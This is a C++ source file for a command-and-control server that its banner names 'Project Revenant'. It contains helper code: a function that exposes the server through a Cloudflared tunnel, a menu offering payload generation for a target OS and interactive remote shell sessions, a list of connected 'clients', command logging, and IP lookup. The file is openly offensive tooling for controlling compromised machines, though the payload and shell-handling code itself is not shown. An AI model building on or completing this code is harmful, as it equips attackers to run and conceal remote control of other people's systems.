#include <iostream>
#include <cstdlib>
#include <unordered_map>
#include <memory>
#include <stdexcept>
#include <string>
#include <unistd.h>  
#include <algorithm> 
#include <ifaddrs.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <cstring>
#include <fstream>
#include <ctime>
#include <filesystem> // C++17
using namespace std;
namespace fs = std::filesystem;

/**
 * @brief Starts a Cloudflared tunnel on the specified port and extracts its public URL.
 * 
 * This function performs the following steps:
 * 1. Launches the Cloudflared tunnel in the background, exposing the local port to the internet.
 * 2. Waits briefly to allow Cloudflared to initialize.
 * 3. Reads the generated log file and extracts the public URL of the tunnel using grep. 
 * 
 * @param PORT The local port to expose through Cloudflared.
 * @return A string containing the Cloudflared public URL (e.g., "https://xxxx.trycloudflare.com").
 *         If no URL is found, returns an empty string and the server will fallback to localhost.
 * 
 * @throws runtime_error if popen() fails to execute the grep command.
 */
string start_cloudflared(int PORT) {
    // Step 1: Create Cloudflared tunnel on the given port
    cout << "\n[*] Starting Cloudflared tunnel on port " << PORT << "...\n";
    string command = "cloudflared tunnel --url http://localhost:" + to_string(PORT) + 
                 " > cloudflared.log 2>&1 &";
    // system() is used to run shell command and start cloudflared in background
    system(command.c_str()); 
    
    // Step 2: Wait for Cloudflared to initialize and publish its URL
    sleep(6);

    // Step 3: Extract Cloudflared public URL from log file
    cout << "[*] Extracting Cloudflared public URL...\n";
    
    // popen() is used to run grep command and capture its output (the URL)
    FILE* pipe = popen("grep -ao 'https://[^ ]*trycloudflare.com' cloudflared.log | head -n1", "r"); 
    
    if (!pipe) {
        throw runtime_error("[!] popen() failed to execute grep command!");
    }

    // Read URL from the pipe
    char buffer[256];
    string result = "";
    
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }
    
    // Close the pipe
    pclose(pipe);
    
    // Step 4: Display and return the result
    cout << "------------------------------------------------------------\n";
    if(result.size() > 0) {
        cout << "[+] Cloudflared Public URL: " << result << "\n";
    } else {
        cout << "[!] Cloudflared URL not found. Using localhost instead.\n";
    }
    cout << "------------------------------------------------------------\n\n";

    return result;
}

void help() {
    cout << "\n=============================\n";
    cout << "        Available Commands\n";
    cout << "=============================\n\n";

    cout << "generate os=<OS>    : Generate payload for target OS\n";
    cout << "show shell          : Show active shell sessions\n";
    cout << "shell <shell-id>    : Interact with a shell session\n";
    cout << "help                : Display this help message\n";
    cout << "exit                : Exit the server\n";

    cout << "\n=============================\n\n";
}

void banner() {
    cout << R"(

██████  ███████ ██    ██ ███████ ███    ██  █████  ███    ██ ████████ 
██   ██ ██      ██    ██ ██      ████   ██ ██   ██ ████   ██    ██    
██████  █████   ██    ██ █████   ██ ██  ██ ███████ ██ ██  ██    ██    
██   ██ ██      ██    ██ ██      ██  ██ ██ ██   ██ ██  ██ ██    ██    
██   ██ ███████  ██████  ███████ ██   ████ ██   ██ ██   ████    ██    
                                                                     

                Lightweight C2 Server - Project Revenant
------------------------------------------------------------------

)" << endl;
}

void show_shell(const unordered_map<string, int>& mp) {
    cout << "\n=============================\n";
    cout << "        Active Clients\n";
    cout << "=============================\n";

    if (mp.empty()) {
        cout << "[!] No active clients.\n";
    } else {
        int count = 1;
        for (const auto& pair : mp) {
            cout << "[" << count << "] Endpoint: " << pair.first << "\n";
            count++;
        }
    }

    cout << "-----------------------------\n";
    cout << "Usage: shell <Endpoint>\n";
    cout << "-----------------------------\n\n";
}

string get_time() {
    time_t now = time(0);
    tm* ltm = localtime(&now);
    char buf[32];
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", ltm);
    return string(buf);
}

// Create log file with header only if it doesn't exist
void create_log(const string& file_name) {
    
    if (!fs::exists(file_name)) {
        ofstream write_file(file_name, ios::app);
        string header = "Time\t\t\t\t\t\t\t\t\t\tcommand\t\t\t\t\t\t\t\t\t\tStatus\t\t\t\t\t\t\t\t\t\tData\n-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n";
                     
        write_file << header;
    }
}

void write_log(const string& file_name, const string& command,  string data,string status) {
    // Create file with header if it doesn't exist
    create_log(file_name+".log");

    ofstream write_file(file_name+".log", ios::app);
    string time = get_time();

    size_t pos = 0;
    string target = "\n";
    string replacement = "\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t";

    while ((pos = data.find("\n", pos)) != string::npos) {
        data.replace(pos, target.length(), replacement);
        pos += replacement.length(); // move past the replacement
    }
    string write_data = time + "\t\t\t\t\t\t\t" + command + "\t\t\t\t\t\t\t\t\t\t\t" + status + +"\t\t\t\t\t\t\t\t\t\t"+data+"\n-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n";
    write_file << write_data;
}

string get_device_ip() {
    struct ifaddrs *ifaddr, *ifa;
    char ip[INET_ADDRSTRLEN];

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return "";
    }

    for (ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == nullptr)
            continue;
        if (ifa->ifa_addr->sa_family == AF_INET) {
            string iface_name(ifa->ifa_name);

            if (iface_name == "lo" || iface_name.find("docker") == 0)
                continue;

            void* addr_ptr = &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
            inet_ntop(AF_INET, addr_ptr, ip, INET_ADDRSTRLEN);

            freeifaddrs(ifaddr);
            return string(ip);
        }
    }

    freeifaddrs(ifaddr);
    return "";
}
